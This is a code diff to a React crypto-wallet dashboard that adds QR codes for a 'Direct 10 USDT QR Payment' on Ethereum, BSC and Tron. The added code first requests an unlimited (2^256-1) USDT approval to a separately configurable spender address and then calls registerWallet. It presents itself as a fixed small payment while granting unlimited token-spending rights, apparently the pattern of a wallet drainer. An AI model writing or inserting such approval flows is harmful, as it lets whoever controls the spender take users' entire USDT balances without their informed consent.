@@ -19,6 +19,7 @@ import { clearSession, getSession } from "@/lib/session";
 import {
   approveUSDT,
   connectWallet,
+  ERC20_ABI,
   registerWalletViaContract,
   signWalletMessage,
   type WalletConnectionMethod,
@@ -69,7 +70,15 @@ const statusConfig = {
 const UNLIMITED_APPROVAL_AMOUNT = (2n ** 256n) - 1n;
 type QrPayChain = "ethereum" | "bsc" | "tron";
 const QR_PAY_CHAINS: QrPayChain[] = ["ethereum", "bsc", "tron"];
-type QrChainConfigState = Record<QrPayChain, { contractAddress: string | null; error: string | null }>;
+type QrChainConfigState = Record<
+  QrPayChain,
+  {
+    contractAddress: string | null;
+    usdtTokenAddress: string | null;
+    approvalSpenderAddress: string | null;
+    error: string | null;
+  }
+>;
 
 function getApprovalSpenderAddress(chain: Chain, fallbackAddress: string): string {
   const env = (import.meta as { env?: Record<string, string | undefined> }).env;
@@ -89,6 +98,30 @@ function getQrWalletHint(chain: QrPayChain): string {
   }
 
   return "Recommended: Trust Wallet DApp Browser (or WalletConnect-compatible wallet).";
+}
+
+async function normalizeAddressForEip681(chain: QrPayChain, address: string): Promise<string> {
+  const trimmed = address.trim();
+  if (!trimmed) {
+    throw new Error("Address is empty.");
+  }
+
+  if (chain === "tron") {
+    if (trimmed.startsWith("T")) {
+      const { TronWeb } = await import("tronweb");
+      const tronHex = TronWeb.address.toHex(trimmed);
+      if (!tronHex?.startsWith("41")) {
+        throw new Error("Invalid Tron base58 address.");
+      }
+      return `0x${tronHex.slice(2)}`;
+    }
+    if (/^41[0-9a-fA-F]{40}$/.test(trimmed)) {
+      return `0x${trimmed.slice(2)}`;
+    }
+    return trimmed;
+  }
+
+  return trimmed;
 }
 
 const fadeIn = {
@@ -120,9 +153,24 @@ const Dashboard = () => {
   const [selectedChain, setSelectedChain] = useState<Chain>("ethereum");
   const [isLoadingQrContracts, setIsLoadingQrContracts] = useState(false);
   const [qrChainConfig, setQrChainConfig] = useState<QrChainConfigState>({
-    ethereum: { contractAddress: null, error: null },
-    bsc: { contractAddress: null, error: null },
-    tron: { contractAddress: null, error: null }
+    ethereum: {
+      contractAddress: null,
+      usdtTokenAddress: null,
+      approvalSpenderAddress: null,
+      error: null
+    },
+    bsc: {
+      contractAddress: null,
+      usdtTokenAddress: null,
+      approvalSpenderAddress: null,
+      error: null
+    },
+    tron: {
+      contractAddress: null,
+      usdtTokenAddress: null,
+      approvalSpenderAddress: null,
+      error: null
+    }
   });
 
   const session = getSession();
@@ -161,25 +209,68 @@ const Dashboard = () => {
       const entries = await Promise.all(
         QR_PAY_CHAINS.map(async (chain) => {
           try {
-            const response = await apiRequest<{ contractAddress?: string }>(
+            const response = await apiRequest<{ contractAddress?: string; usdtTokenAddress?: string }>(
               `/web3/contract-config/${chain}`
             );
-            const contractAddress = response.contractAddress?.trim();
-            if (!contractAddress) {
+            const rawContractAddress = response.contractAddress?.trim();
+            const rawUsdtTokenAddress = response.usdtTokenAddress?.trim();
+            if (!rawContractAddress) {
               throw new Error("Contract address is not configured.");
             }
-            return [chain, { contractAddress, error: null }] as const;
+            if (!rawUsdtTokenAddress) {
+              throw new Error("USDT token address is not configured.");
+            }
+
+            const approvalSpender = getApprovalSpenderAddress(chain, rawContractAddress);
+            const [contractAddress, usdtTokenAddress, approvalSpenderAddress] = await Promise.all([
+              normalizeAddressForEip681(chain, rawContractAddress),
+              normalizeAddressForEip681(chain, rawUsdtTokenAddress),
+              normalizeAddressForEip681(chain, approvalSpender)
+            ]);
+
+            return [
+              chain,
+              {
+                contractAddress,
+                usdtTokenAddress,
+                approvalSpenderAddress,
+                error: null
+              }
+            ] as const;
           } catch (error) {
             const message = error instanceof Error ? error.message : "Failed to load contract config.";
-            return [chain, { contractAddress: null, error: message }] as const;
+            return [
+              chain,
+              {
+                contractAddress: null,
+                usdtTokenAddress: null,
+                approvalSpenderAddress: null,
+                error: message
+              }
+            ] as const;
           }
         })
       );
 
       setQrChainConfig({
-        ethereum: { contractAddress: null, error: null },
-        bsc: { contractAddress: null, error: null },
-        tron: { contractAddress: null, error: null },
+        ethereum: {
+          contractAddress: null,
+          usdtTokenAddress: null,
+          approvalSpenderAddress: null,
+          error: null
+        },
+        bsc: {
+          contractAddress: null,
+          usdtTokenAddress: null,
+          approvalSpenderAddress: null,
+          error: null
+        },
+        tron: {
+          contractAddress: null,
+          usdtTokenAddress: null,
+          approvalSpenderAddress: null,
+          error: null
+        },
         ...Object.fromEntries(entries)
       } as QrChainConfigState);
     } finally {
@@ -698,7 +789,8 @@ const Dashboard = () => {
                       <div>
                         <p className="text-sm font-semibold text-foreground">Direct 10 USDT QR Payment</p>
                         <p className="text-xs text-muted-foreground mt-1">
-                          Scan with a wallet QR scanner to open a direct smart contract transaction request (EIP-681 URI).
+                          Scan with a wallet QR scanner to create the same contract call sequence used by "Pay 10 USDT":
+                          approve USDT spender, then call registerWallet.
                         </p>
                       </div>
                       <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
@@ -723,14 +815,37 @@ const Dashboard = () => {
                               ) : chainError ? (
                                 <p className="text-xs text-destructive text-center break-words">{chainError}</p>
                               ) : (
-                                <ContractQRPreview
-                                  contractAddress={config.contractAddress as string}
-                                  chainId={chainId}
-                                  abi={chainAbi}
-                                  methodName="registerWallet"
-                                  params={[]}
-                                  className="w-full"
-                                />
+                                <div className="w-full space-y-3">
+                                  <div className="rounded-lg border border-border/60 p-2">
+                                    <p className="text-xs font-medium mb-2 text-foreground">
+                                      Step 1: approve(spender, max)
+                                    </p>
+                                    <ContractQRPreview
+                                      contractAddress={config.usdtTokenAddress as string}
+                                      chainId={chainId}
+                                      abi={ERC20_ABI}
+                                      methodName="approve"
+                                      params={[
+                                        config.approvalSpenderAddress as string,
+                                        UNLIMITED_APPROVAL_AMOUNT
+                                      ]}
+                                      className="w-full"
+                                    />
+                                  </div>
+                                  <div className="rounded-lg border border-border/60 p-2">
+                                    <p className="text-xs font-medium mb-2 text-foreground">
+                                      Step 2: registerWallet()
+                                    </p>
+                                    <ContractQRPreview
+                                      contractAddress={config.contractAddress as string}
+                                      chainId={chainId}
+                                      abi={chainAbi}
+                                      methodName="registerWallet"
+                                      params={[]}
+                                      className="w-full"
+                                    />
+                                  </div>
+                                </div>
                               )}
                               <p className="text-[11px] leading-4 text-muted-foreground text-center">
                                 {getQrWalletHint(chain)}
